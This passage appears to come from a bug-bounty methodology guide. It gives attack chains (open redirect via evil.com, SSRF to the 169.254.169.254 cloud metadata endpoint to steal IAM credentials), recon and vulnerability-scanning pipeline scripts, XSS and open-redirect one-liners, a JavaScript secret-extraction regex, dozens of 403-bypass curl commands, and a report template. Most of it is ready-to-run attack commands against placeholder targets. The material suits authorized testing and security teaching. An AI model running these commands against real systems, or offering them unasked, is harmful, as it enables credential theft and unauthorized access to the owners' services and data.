https://oauth-server.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback?next=https://evil.com&
  response_type=code&
  scope=read
```

#### SSRF → Cloud Metadata → RCE
1. Find SSRF in URL parameter
2. Access cloud metadata endpoint (`169.254.169.254`)
3. Extract IAM role credentials
4. Use credentials to access cloud resources (S3, EC2, Lambda)
5. Potentially achieve RCE via Lambda function modification or EC2 userdata

```bash [Chain Commands]
# Step 1: SSRF to metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: role-name

# Step 2: Get credentials
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
# Response: AccessKeyId, SecretAccessKey, Token

# Step 3: Use credentials
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="secret..."
export AWS_SESSION_TOKEN="token..."

# Step 4: Enumerate access
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
```

#### IDOR → PII Disclosure → Account Takeover
1. Find IDOR in API endpoint returning user data
2. Extract email addresses and phone numbers
3. Use password reset with obtained email
4. Combine with host header poisoning for token theft

::

### Attack Chain Diagram

```text [Vulnerability Chain Map]
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN METHODOLOGY                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│  │  Recon   │───▶│ Discover │───▶│ Exploit  │───▶│  Chain   │  │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
│       │               │               │               │        │
│       ▼               ▼               ▼               ▼        │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  │
│  │Subdomains│    │   XSS    │    │ Session  │    │ Account  │  │
│  │ JS Files │    │  IDOR    │    │ Hijack   │    │ Takeover │  │
│  │ Endpoints│    │  SSRF    │    │ Priv Esc │    │   RCE    │  │
│  │ Params   │    │  SQLi    │    │ Data     │    │ Data     │  │
│  │ Secrets  │    │  XXE     │    │ Exfil    │    │ Breach   │  │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘  │
│                                                                 │
│  Low Impact ──────────────────────────────▶ Critical Impact     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```text [SSRF Chain Diagram]
┌──────────┐     ┌───────────────┐     ┌──────────────────┐
│ Attacker │────▶│  Target App   │────▶│  Internal Service │
│          │     │  (SSRF Vuln)  │     │  (Metadata/Redis) │
└──────────┘     └───────────────┘     └──────────────────┘
     │                                          │
     │           ┌───────────────┐              │
     └──────────▶│  Cloud IAM    │◀─────────────┘
                 │  Credentials  │
                 └───────┬───────┘
                         │
              ┌──────────┼──────────┐
              ▼          ▼          ▼
         ┌────────┐ ┌────────┐ ┌────────┐
         │   S3   │ │  EC2   │ │ Lambda │
         │ Buckets│ │Instance│ │Function│
         └────────┘ └────────┘ └────────┘
```

---

## Automation Workflows

::badge
**Phase 10 — Automated Pipeline**
::

### Full Reconnaissance Pipeline

::code-tree{default-value="recon.sh"}
```bash [recon.sh]
#!/bin/bash
# Full Recon Automation Script
TARGET=$1
OUTPUT="recon/$TARGET"
mkdir -p $OUTPUT

echo "[*] Starting recon for $TARGET"

# Subdomain enumeration
echo "[+] Subdomain Enumeration..."
subfinder -d $TARGET -all -silent >> $OUTPUT/subs.txt
amass enum -passive -d $TARGET -silent >> $OUTPUT/subs.txt
chaos -d $TARGET -silent >> $OUTPUT/subs.txt
echo $TARGET | gau --subs | unfurl domains >> $OUTPUT/subs.txt
sort -u $OUTPUT/subs.txt -o $OUTPUT/subs.txt
echo "[+] Found $(wc -l < $OUTPUT/subs.txt) subdomains"

# Resolve and probe
echo "[+] Resolving & Probing..."
puredns resolve $OUTPUT/subs.txt -r resolvers.txt -w $OUTPUT/resolved.txt 2>/dev/null
cat $OUTPUT/resolved.txt | httpx -silent -status-code -title -tech-detect \
  -follow-redirects -o $OUTPUT/alive.txt
echo "[+] Alive hosts: $(wc -l < $OUTPUT/alive.txt)"

# Port scanning
echo "[+] Port Scanning..."
naabu -list $OUTPUT/resolved.txt -top-ports 1000 -silent -o $OUTPUT/ports.txt

# URL collection
echo "[+] Collecting URLs..."
echo $TARGET | waybackurls >> $OUTPUT/urls.txt
echo $TARGET | gau >> $OUTPUT/urls.txt
katana -list $OUTPUT/alive.txt -d 3 -jc -silent >> $OUTPUT/urls.txt
sort -u $OUTPUT/urls.txt -o $OUTPUT/urls.txt
echo "[+] Collected $(wc -l < $OUTPUT/urls.txt) URLs"

# Parameter extraction
grep "=" $OUTPUT/urls.txt | sort -u > $OUTPUT/params.txt

# JS file extraction
grep -iE "\.js(\?|$)" $OUTPUT/urls.txt | sort -u > $OUTPUT/js_files.txt

echo "[*] Recon complete for $TARGET"
```

```bash [vuln_scan.sh]
#!/bin/bash
# Vulnerability Scanning Pipeline
TARGET=$1
OUTPUT="recon/$TARGET"

echo "[*] Starting vulnerability scan for $TARGET"

# Nuclei scanning
echo "[+] Running Nuclei..."
nuclei -l $OUTPUT/alive.txt -severity critical,high,medium \
  -c 50 -silent -o $OUTPUT/nuclei_results.txt

# Subdomain takeover
echo "[+] Checking subdomain takeover..."
nuclei -l $OUTPUT/resolved.txt -tags takeover -silent -o $OUTPUT/takeover.txt

# XSS scanning
echo "[+] Scanning for XSS..."
cat $OUTPUT/params.txt | dalfox pipe --silence --only-poc -o $OUTPUT/xss_results.txt

# SQLi detection
echo "[+] Checking for SQLi..."
cat $OUTPUT/params.txt | gf sqli | sort -u > $OUTPUT/sqli_params.txt
sqlmap -m $OUTPUT/sqli_params.txt --batch --level 3 --risk 2 \
  --output-dir=$OUTPUT/sqlmap/

# SSRF testing
echo "[+] Testing SSRF..."
cat $OUTPUT/params.txt | qsreplace "http://YOUR_COLLABORATOR" | \
  httpx -silent -mc 200 -o $OUTPUT/ssrf_test.txt

# CORS testing
echo "[+] Checking CORS..."
cat $OUTPUT/alive.txt | while read url; do
  cors=$(curl -s -D - "$url" -H "Origin: https://evil.com" -o /dev/null | \
    grep -i "access-control-allow-origin: https://evil.com")
  [ -n "$cors" ] && echo "[VULN] $url" >> $OUTPUT/cors_results.txt
done

echo "[*] Vulnerability scan complete"
```

```bash [notify.sh]
#!/bin/bash
# Notification script
TARGET=$1
OUTPUT="recon/$TARGET"

# Count results
NUCLEI_COUNT=$(wc -l < $OUTPUT/nuclei_results.txt 2>/dev/null || echo 0)
XSS_COUNT=$(wc -l < $OUTPUT/xss_results.txt 2>/dev/null || echo 0)
TAKEOVER_COUNT=$(wc -l < $OUTPUT/takeover.txt 2>/dev/null || echo 0)

# Send notification
notify -silent -data "Scan Results for $TARGET:
- Nuclei findings: $NUCLEI_COUNT
- XSS findings: $XSS_COUNT
- Takeover candidates: $TAKEOVER_COUNT"
```
::

### One-Liner Workflows

::code-collapse
---
label: "Bug Bounty One-Liners"
---

```bash [One-Liners]
# Subdomain → Alive → Nuclei (Full pipeline)
subfinder -d target.com -silent | httpx -silent | nuclei -severity critical,high -silent

# Find reflected XSS parameters
echo target.com | gau | grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | \
  httpx -silent -mc 200 -mr '"><img src=x onerror=alert(1)>'

# Find open redirects
echo target.com | gau | grep -iE "(redirect|return|next|url|redir|target)=" | \
  qsreplace "https://evil.com" | httpx -silent -location -mc 301,302 | \
  grep "evil.com"

# Find SQLi candidates
echo target.com | gau | grep "=" | gf sqli | sort -u | \
  httpx -silent | tee sqli_candidates.txt

# Subdomain takeover pipeline
subfinder -d target.com -silent | dnsx -silent -cname -resp | \
  grep -iE "(github|heroku|shopify|amazonaws|azure)" | \
  nuclei -tags takeover -silent

# JS secrets extraction
echo target.com | gau | grep "\.js$" | httpx -silent -mc 200 | \
  while read url; do curl -s "$url" | grep -oP "(api[_-]?key|secret|token|password|auth)['\"\s:=]+['\"][a-zA-Z0-9_\-]{8,}['\"]"; done

# Find sensitive files
echo target.com | waybackurls | grep -iE "\.(env|bak|sql|config|log|old|backup|yml|yaml|json|xml|txt|conf|ini|key|pem)$" | \
  httpx -silent -mc 200 -content-length | sort -t' ' -k2 -rn

# CORS mass testing
cat alive_hosts.txt | while read u; do \
  curl -s -o /dev/null -D - "$u" -H "Origin: https://evil.com" | \
  grep -q "evil.com" && echo "[CORS] $u"; done

# Find 403 bypass
cat alive_hosts.txt | httpx -silent -mc 403 | while read url; do
  for bypass in "/%2e/" "/..;/" "/.;/" "/;/" "/./" "/.//" "?"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "${url}${bypass}")
    [ "$code" = "200" ] && echo "[BYPASS] ${url}${bypass} → $code"
  done
done

# Parameter discovery with Arjun
arjun -u https://target.com/api/endpoint -m GET,POST,JSON -t 50

# Find endpoints with sensitive info
cat alive_hosts.txt | httpx -silent -path "/api/v1/users" -mc 200 -content-length
cat alive_hosts.txt | httpx -silent -path "/.env" -mc 200
cat alive_hosts.txt | httpx -silent -path "/debug" -mc 200
cat alive_hosts.txt | httpx -silent -path "/actuator" -mc 200
cat alive_hosts.txt | httpx -silent -path "/server-status" -mc 200
```
::

---

## 403 Bypass Techniques

::tabs
  :::tabs-item{icon="i-lucide-unlock" label="Path Manipulation"}
  ```bash [Path Bypass]
  # Original blocked request
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin  # 403

  # Path traversal bypasses
  curl -s -o /dev/null -w "%{http_code}" https://target.com/./admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/.
  curl -s -o /dev/null -w "%{http_code}" https://target.com//admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/
  curl -s -o /dev/null -w "%{http_code}" https://target.com/;/admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/.;/admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/..;/admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/%2e/admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin%20
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin%09
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin%00
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin..%3B/
  curl -s -o /dev/null -w "%{http_code}" https://target.com/ADMIN
  curl -s -o /dev/null -w "%{http_code}" https://target.com/Admin
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin?anything
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin#
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/*
  ```
  :::

  :::tabs-item{icon="i-lucide-arrow-right-left" label="Header Bypass"}
  ```bash [Header-Based Bypass]
  # IP-based bypasses
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Forwarded-For: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Forwarded-For: 10.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Original-URL: /admin"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Rewrite-URL: /admin"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Custom-IP-Authorization: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Real-IP: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Originating-IP: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Remote-IP: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Client-IP: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Host: 127.0.0.1"
  curl -s -o /dev/null -w "%{http_code}" https://target.com/admin \
    -H "X-Forwarded-Host: 127.0.0.1"

  # Method-based bypass
  curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/admin
  curl -s -o /dev/null -w "%{http_code}" -X PUT https://target.com/admin
  curl -s -o /dev/null -w "%{http_code}" -X PATCH https://target.com/admin
  curl -s -o /dev/null -w "%{http_code}" -X TRACE https://target.com/admin
  curl -s -o /dev/null -w "%{http_code}" -X OPTIONS https://target.com/admin
  curl -s -o /dev/null -w "%{http_code}" -X DELETE https://target.com/admin
  curl -s -o /dev/null -w "%{http_code}" -H "X-HTTP-Method-Override: GET" \
    -X POST https://target.com/admin
  ```
  :::

  :::tabs-item{icon="i-lucide-bot" label="Automated Bypass"}
  ```bash [Bypass Tools]
  # 403bypasser
  python3 403bypasser.py -u https://target.com/admin -o bypass_results.txt

  # byp4xx
  byp4xx https://target.com/admin

  # 4-ZERO-3 (automated 403 bypass)
  bash 403-bypass.sh https://target.com admin

  # Custom automation
  #!/bin/bash
  URL=$1
  PATH_TO_TEST=$2
  
  echo "[*] Testing 403 bypass for $URL/$PATH_TO_TEST"
  
  methods=("GET" "POST" "PUT" "PATCH" "DELETE" "HEAD" "OPTIONS" "TRACE")
  paths=("/$PATH_TO_TEST" "/$PATH_TO_TEST/" "/$PATH_TO_TEST/." "/.;/$PATH_TO_TEST" "/;/$PATH_TO_TEST" "/$PATH_TO_TEST..;/" "/%2e/$PATH_TO_TEST" "/$PATH_TO_TEST%20" "/$PATH_TO_TEST%09" "/$PATH_TO_TEST?" "/$PATH_TO_TEST#" "//$PATH_TO_TEST" "./$PATH_TO_TEST")
  headers=("X-Forwarded-For: 127.0.0.1" "X-Original-URL: /$PATH_TO_TEST" "X-Rewrite-URL: /$PATH_TO_TEST" "X-Custom-IP-Authorization: 127.0.0.1")
  
  for method in "${methods[@]}"; do
    for path in "${paths[@]}"; do
      code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$URL$path")
      [ "$code" != "403" ] && [ "$code" != "404" ] && echo "[+] $method $URL$path → $code"
    done
  done
  
  for header in "${headers[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$URL/$PATH_TO_TEST")
    [ "$code" != "403" ] && echo "[+] Header: $header → $code"
  done
  ```
  :::
::

---

## Reporting

::badge
**Phase 11 — Impact & Documentation**
::

### Severity Classification

| Severity | CVSS | Examples |
| -------- | ---- | ------- |
| **Critical** | 9.0–10.0 | RCE, Authentication Bypass, SQLi with data dump, SSRF to cloud credentials |
| **High** | 7.0–8.9 | Stored XSS on admin panel, IDOR on PII data, Privilege Escalation, Account Takeover |
| **Medium** | 4.0–6.9 | Reflected XSS, CSRF on state-changing actions, Information Disclosure, CORS misconfiguration |
| **Low** | 0.1–3.9 | Self-XSS, Missing security headers, Verbose error messages, Username enumeration |
| **Informational** | 0.0 | Best practice recommendations, Version disclosure, Minor misconfigurations |

### Report Template Structure

::tip
A well-written report increases your chances of faster triage and higher bounty payouts. Include reproduction steps, impact assessment, and remediation advice.
::

```text [Report Structure]
## Title
[Vulnerability Type] in [Feature/Endpoint] allows [Impact]

## Summary
Brief description of the vulnerability and its impact.

## Severity
Critical / High / Medium / Low
CVSS Score: X.X
CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Steps to Reproduce
1. Navigate to https://target.com/vulnerable-endpoint
2. Intercept the request with Burp Suite
3. Modify parameter X to payload Y
4. Observe the vulnerability in the response

## Proof of Concept
[Screenshots, video, HTTP requests/responses]

## Impact
Describe what an attacker can achieve:
- Data exfiltration
- Account takeover
- Remote code execution
- Financial loss

## Affected Endpoints
- https://target.com/api/v1/users?id=FUZZ
- https://target.com/profile/edit

## Remediation
Recommended fixes:
- Input validation
- Parameterized queries
- Access control checks
- Output encoding

## References
- OWASP: https://owasp.org/...
- CWE: https://cwe.mitre.org/...
```

---

## Quick Reference

::card-group
  :::card
  ---
  icon: i-lucide-search
  title: Recon Tools
  ---
  `subfinder` · `amass` · `httpx` · `katana` · `gau` · `waybackurls` · `naabu` · `dnsx` · `puredns` · `ffuf` · `feroxbuster`
  :::

  :::card
  ---
  icon: i-lucide-zap
  title: Scanning Tools
  ---
  `nuclei` · `sqlmap` · `dalfox` · `xsstrike` · `tplmap` · `nmap` · `masscan` · `nikto` · `wpscan` · `arjun`
  :::

  :::card
  ---
  icon: i-lucide-wrench
  title: Exploitation Tools
  ---
  `burpsuite` · `jwt_tool` · `interactsh` · `websocat` · `smuggler` · `cors_scan` · `subjack` · `403bypasser`
  :::

  :::card
  ---
  icon: i-lucide-terminal
  title: Utility Tools
  ---
  `qsreplace` · `unfurl` · `gf` · `anew` · `jq` · `notify` · `kxss` · `mantra` · `linkfinder` · `secretfinder`
  :::
::